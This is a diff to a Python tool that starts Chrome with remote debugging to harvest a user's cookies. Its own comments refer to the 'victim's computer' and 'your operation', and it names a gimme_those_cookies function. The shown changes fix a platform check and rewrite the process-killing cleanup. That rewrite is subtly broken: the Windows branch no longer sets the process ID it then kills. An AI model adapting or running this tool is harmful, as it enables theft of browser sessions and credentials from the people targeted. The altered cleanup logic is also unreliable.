@@ -33,7 +33,7 @@ elif sys.platform == "darwin":
     CHROME_CMD = "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
     USER_DATA_DIR = "$HOME/Library/Application Support/Google/Chrome"
 
-elif sys.platform.startswith == "win":
+elif sys.platform.startswith("win"):
     CHROME_CMD = "chrome.exe"
     USER_DATA_DIR = r"%LOCALAPPDATA%\Google\Chrome\User Data"
 
@@ -46,7 +46,6 @@ if PROFILE_NAME != "Default":
     # Move the relevant user data dir to somewhere and point Chrome there,
     # since Chrome will always select the "Default" profile in a given directory,
     # and all Chrome profiles are in the same User Data Directory by default.
-
 
     if sys.platform.startswith("linux") or sys.platform == "darwin":
         # it's a unix system
@@ -130,26 +129,21 @@ def gimme_those_cookies(ws_url):
     return cookies
 
 def cleanup(chrome_process):
-    # Kill the PID + 1 because the actual PID will just be bash spawning Chrome.
-    # I SURE HOPE there's no race condition, causing this to kill some other
-    # innocent PID, crashing the victim's computer and ruining your operation.
 
-
+    # Try and kill the first chrome process with a PID higher than ours.
     if sys.platform.startswith("linux") or sys.platform == "darwin":
         for p in map(int, sorted(subprocess.check_output(["pidof", CHROME_CMD]).split())):
             if p > chrome_process.pid:
                 pid = p
                 break
-    else:
-        pid = chrome_process.pid + 1
+            else:
+                pid = chrome_process.pid + 1
 
     os.kill(pid, signal.SIGKILL)
 
     # If we copied a Profile's User Data Directory somewhere, clean it up.
     if fake_user_data_dir is not None:
         shutil.rmtree(fake_user_data_dir)
-
-
 
 if __name__ == "__main__":
     forbidden_process = summon_forbidden_protocol()
